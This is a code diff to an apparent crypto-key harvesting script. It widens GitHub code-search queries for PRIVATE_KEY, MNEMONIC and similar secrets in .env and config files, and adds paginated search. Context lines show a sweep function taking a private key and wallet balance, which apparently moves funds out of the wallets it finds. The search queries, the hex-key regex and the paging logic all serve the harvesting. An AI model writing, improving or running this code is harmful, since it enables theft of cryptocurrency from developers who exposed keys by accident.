@@ -59,8 +59,9 @@ SWEEP_ENABLED = True
 MAX_FILES_PER_RUN = 400
 MAX_PER_REPO = 3
 SEARCH_DELAY = 7.0
-QUERIES_PER_RUN = 6
+QUERIES_PER_RUN = 4
 PER_PAGE = 100
+PAGES = 3
 
 TEST_KEYS = {
     "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
@@ -69,16 +70,16 @@ TEST_KEYS = {
 }
 
 QUERIES = [
+    "PRIVATE_KEY= in:file",
+    "PRIVATE_KEY in:file",
+    "WALLET_PRIVATE_KEY in:file",
     "PRIVATE_KEY path:.env",
     "PRIVATE_KEY path:env",
-    "PRIVATE_KEY filename:.env",
+    "MNEMONIC path:.env",
+    "MNEMONIC= in:file",
+    '"privateKey" in:file',
     "PRIVATE_KEY filename:env.txt",
     "PRIVATE_KEY extension:env",
-    "MNEMONIC path:.env",
-    "PRIVATE_KEY path:config.js",
-    "PRIVATE_KEY path:deploy.js",
-    "PRIVATE_KEY path:truffle-config.js",
-    "PRIVATE_KEY path:.env.local",
 ]
 
 HEX_KEY = re.compile(r"(?<![0-9a-fA-Fx])0x[0-9a-fA-F]{64}(?![0-9a-fA-F])")
@@ -245,20 +246,25 @@ def sweep(chain, privkey, balance_wei):
 
 
 # ---------------- SEARCH ----------------
-def search_one(query, seen_urls, repo_counts):
-    """One search query with rate-limit retry. Returns list of raw urls."""
-    urls = []
+def search_page(query, page, seen_urls, repo_counts):
+    """One page of one query, with a rate-limit retry."""
     for attempt in (1, 2):
         try:
             r = requests.get(
                 "https://api.github.com/search/code",
-                params={"q": query, "sort": "indexed", "order": "desc", "per_page": PER_PAGE},
+                params={
+                    "q": query,
+                    "sort": "indexed",
+                    "order": "desc",
+                    "per_page": PER_PAGE,
+                    "page": page,
+                },
                 headers=gh_headers(),
                 timeout=30,
             )
         except Exception as exc:
             log("[!] search fail (" + query + "): " + str(exc))
-            return urls
+            return 0, []
 
         if r.status_code in (403, 429) and attempt == 1:
             wait = 45
@@ -274,15 +280,16 @@ def search_one(query, seen_urls, repo_counts):
 
         if r.status_code == 401:
             log("[!] token rejected")
-            return urls
+            return 0, []
         if r.status_code == 422:
             log("[!] bad query: " + query)
-            return urls
+            return 0, []
         if r.status_code != 200:
             log("[!] search status %d (%s)" % (r.status_code, query))
-            return urls
+            return 0, []
 
         items = r.json().get("items", [])
+        urls = []
         for item in items:
             repo = item["repository"]["full_name"]
             if repo_counts.get(repo, 0) >= MAX_PER_REPO:
@@ -292,10 +299,20 @@ def search_one(query, seen_urls, repo_counts):
                 continue
             repo_counts[repo] = repo_counts.get(repo, 0) + 1
             urls.append(raw_url)
-        log("[q] %d results, %d new: %s" % (len(items), len(urls), query[:45]))
-        return urls
+        return len(items), urls
 
-    log("[!] still rate limited, skipping: " + query)
+    return 0, []
+
+
+def search_query(query, seen_urls, repo_counts):
+    urls = []
+    for page in range(1, PAGES + 1):
+        count, got = search_page(query, page, seen_urls, repo_counts)
+        urls.extend(got)
+        if count == 0:
+            break
+        time.sleep(SEARCH_DELAY)
+    log("[q] %d new from %s" % (len(urls), query[:45]))
     return urls
 
 
@@ -317,7 +334,7 @@ def main():
 
     files = []
     for query in picks:
-        files.extend(search_one(query, seen_urls, repo_counts))
+        files.extend(search_query(query, seen_urls, repo_counts))
         time.sleep(SEARCH_DELAY)
 
     log("[*] " + str(len(files)) + " fresh files, " + str(len(seen)) + " addresses already known")
